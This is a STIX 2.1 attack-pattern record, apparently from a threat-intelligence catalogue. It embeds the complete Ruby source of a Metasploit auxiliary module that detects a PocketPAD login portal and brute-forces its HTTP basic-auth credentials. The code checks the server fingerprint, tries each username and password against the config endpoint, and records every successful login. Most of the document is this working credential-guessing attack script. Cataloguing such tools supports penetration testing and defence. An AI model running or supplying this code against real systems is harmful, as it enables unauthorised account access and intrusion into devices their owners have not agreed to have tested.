{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04d9788f-2ad3-409f-b9b3-eeca7fd4f67f",
    "created": "2024-08-14T16:30:06.77137Z",
    "modified": "2024-08-14T16:30:06.771376Z",
    "name": "PocketPAD Login Bruteforce Force Utility",
    "description": " This module scans for PocketPAD login portal, and performs a login bruteforce attack to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/pocketpad_login.rb",
            "external_id": "pocketpad_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n    'Name'           => 'PocketPAD Login Bruteforce Force Utility',\n    'Description'    => %{\n      This module scans for PocketPAD login portal, and\n      performs a login bruteforce attack to identify valid credentials.\n    },\n    'Author'         =>\n      [\n        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',\n      ],\n    'License'        => MSF_LICENSE\n    ))\n\n    deregister_options('HttpUsername', 'HttpPassword')\n  end\n\n  def run_host(ip)\n    unless is_app_popad?\n      return\n    end\n\n    print_status(\"Starting login bruteforce...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the target actually isn't PocketPAD\n  #\n\n  def is_app_popad?\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/',\n        'method'    => 'GET'\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      vprint_error(\"HTTP Connection Failed...\")\n      return false\n    end\n\n    if res && res.code == 200 && res.headers['Server'] && res.headers['Server'].include?(\"Smeagol\") && res.body.include?(\"PocketPAD\")\n      vprint_good(\"Running PocketPAD application ...\")\n      return true\n    else\n      vprint_error(\"Application is not PocketPAD. Module will not continue.\")\n      return false\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_time: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/cgi-bin/config.cgi',\n        'method'    => 'POST',\n        'authorization' => basic_auth(user,pass),\n        'vars_post'    => {\n          'file' => \"configindex.html\"\n          }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"HTTP Connection Failed...\")\n      return :abort\n    end\n\n    if (res && res.code == 200 && res.body.include?(\"Home Page\") && res.headers['Server'] && res.headers['Server'].include?(\"Smeagol\"))\n      print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'PocketPAD Portal',\n        user: user,\n        password: pass,\n        proof: res.body\n      )\n      return :next_user\n    else\n      vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\nend\n"
}